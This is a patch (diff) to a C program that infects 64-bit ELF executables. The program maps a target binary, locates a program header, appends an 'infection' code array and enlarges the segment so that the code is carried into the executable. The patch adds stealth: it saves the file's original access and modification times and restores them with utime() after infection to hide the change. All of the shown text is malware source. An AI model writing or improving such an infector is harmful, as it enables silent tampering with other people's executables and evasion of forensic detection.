@@ -10,7 +10,9 @@
 #include <unistd.h>
 #include <sys/stat.h>
 #include <sys/mman.h>
+#include <sys/types.h>
 #include <fcntl.h>
+#include <utime.h>
 #include <elf.h>
 
 /* This array contains the relocatable assembly program. The final
@@ -44,9 +46,10 @@ static void bail(char const *prefix, char const *msg)
 }
 
 /* Map a file into read-write memory. The return value is a pointer to
- * the beginning of the file image.
+ * the beginning of the file image. If utimbuf is not NULL, it receives
+ * the file's current access and modification times.
  */
-static void *mapfile(char const *filename)
+static void *mapfile(char const *filename, struct utimbuf *utimbuf)
 {
     struct stat stat;
     void *ptr;
@@ -62,6 +65,10 @@ static void *mapfile(char const *filename)
     ptr = mmap(NULL, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
     if (ptr == MAP_FAILED)
 	bail(filename, strerror(errno));
+    if (utimbuf) {
+	utimbuf->actime = stat.st_atime;
+	utimbuf->modtime = stat.st_mtime;
+    }
     return ptr;
 }
 
@@ -96,11 +103,12 @@ static int findinfectionphdr(Elf64_Phdr const *phdr, int count)
  */
 int main(int argc, char *argv[])
 {
-    Elf64_Ehdr *ehdr;
     char const *filename;
+    struct utimbuf timestamps;
+    Elf64_Ehdr *ehdr;
     Elf64_Phdr *phdr;
-    char *image;
     Elf64_Off pos;
+    char *image;
     int n;
 
     if (argc != 2)
@@ -110,7 +118,7 @@ int main(int argc, char *argv[])
     /* Load the file into memory and verify that it is a 64-bit ELF
      * executable.
      */
-    image = mapfile(filename);
+    image = mapfile(filename, &timestamps);
     if (memcmp(image, ELFMAG, SELFMAG))
 	bail(filename, "not an ELF file.");
     if (image[EI_CLASS] != ELFCLASS64)
@@ -141,6 +149,11 @@ int main(int argc, char *argv[])
 	   infection, sizeof infection);
     phdr[n].p_filesz += sizeof infection;
     phdr[n].p_memsz += sizeof infection;
+
+    /* Attempt to restore the file's original mtime. (This will fail
+     * in most situations, but there's no harm in trying.)
+     */
+    utime(filename, &timestamps);
 
     return 0;
 }
